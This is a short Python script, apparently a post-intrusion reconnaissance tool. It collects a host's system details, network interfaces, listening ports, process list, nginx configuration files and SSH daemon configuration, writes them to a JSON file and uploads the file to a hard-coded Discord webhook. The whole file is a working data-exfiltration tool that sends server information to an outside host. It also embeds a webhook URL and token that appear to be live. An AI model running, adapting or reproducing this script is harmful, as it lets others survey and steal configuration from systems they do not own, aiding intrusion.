import os
import json
import socket
import platform
import psutil
import requests

from datetime import datetime

# =====================================
# DISCORD WEBHOOK
# =====================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1503646047392497734/XcLXQ-_6dQitfgz81wSxYCpAmJeb1yBgTZlhIPpa4sQ4v7yp48kVW7jpYPkiJq4lfOHo"

# =====================================
# SYSTEM INFO
# =====================================
def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "os": platform.platform(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "boot_time": datetime.fromtimestamp(
            psutil.boot_time()
        ).strftime("%Y-%m-%d %H:%M:%S")
    }

# =====================================
# NETWORK INFO
# =====================================
def get_network_info():

    interfaces = {}

    for iface, addrs in psutil.net_if_addrs().items():

        interfaces[iface] = []

        for addr in addrs:

            interfaces[iface].append({
                "family": str(addr.family),
                "address": addr.address
            })

    return interfaces

# =====================================
# OPEN PORTS
# =====================================
def get_open_ports():

    ports = []

    for conn in psutil.net_connections(kind='inet'):

        if conn.status == "LISTEN":

            ports.append({
                "ip": conn.laddr.ip,
                "port": conn.laddr.port,
                "pid": conn.pid
            })

    return ports

# =====================================
# RUNNING PROCESS
# =====================================
def get_processes():

    processes = []

    for proc in psutil.process_iter(['pid', 'name', 'username']):

        try:
            processes.append(proc.info)

        except:
            pass

    return processes

# =====================================
# NGINX CONFIG
# =====================================
def collect_nginx_config():

    nginx_paths = [
        "/etc/nginx/nginx.conf",
        "/etc/nginx/sites-enabled"
    ]

    nginx_data = {}

    for path in nginx_paths:

        if os.path.exists(path):

            # FILE
            if os.path.isfile(path):

                try:
                    with open(path, "r") as f:
                        nginx_data[path] = f.read()

                except Exception as e:
                    nginx_data[path] = str(e)

            # DIRECTORY
            elif os.path.isdir(path):

                nginx_data[path] = {}

                for file in os.listdir(path):

                    full = os.path.join(path, file)

                    if os.path.isfile(full):

                        try:
                            with open(full, "r") as f:
                                nginx_data[path][file] = f.read()

                        except Exception as e:
                            nginx_data[path][file] = str(e)

    return nginx_data

# =====================================
# SSH CONFIG
# =====================================
def collect_ssh_config():

    ssh_path = "/etc/ssh/sshd_config"

    if os.path.exists(ssh_path):

        try:
            with open(ssh_path, "r") as f:
                return f.read()

        except Exception as e:
            return str(e)

    return "SSH config not found"

# =====================================
# SAVE RESULT
# =====================================
def save_results(data, filename="recon_results.json"):

    with open(filename, "w") as f:
        json.dump(data, f, indent=4)

    return filename

# =====================================
# SEND TO DISCORD
# =====================================
def send_to_discord(filepath):

    try:

        with open(filepath, "rb") as f:

            files = {
                "file": f
            }

            payload = {
                "content": "Recon completed"
            }

            response = requests.post(
                WEBHOOK_URL,
                data=payload,
                files=files
            )

        print(f"[+] Discord response: {response.status_code}")

    except Exception as e:
        print(f"[!] Failed send to Discord: {e}")

# =====================================
# MAIN
# =====================================
if __name__ == "__main__":

    print("[*] Collecting recon data...")

    recon_data = {

        "system_info": get_system_info(),

        "network_info": get_network_info(),

        "open_ports": get_open_ports(),

        "processes": get_processes(),

        "nginx_config": collect_nginx_config(),

        "ssh_config": collect_ssh_config()
    }

    filename = save_results(recon_data)

    print(f"[+] Saved to {filename}")

    send_to_discord(filename)

    print("[+] Done")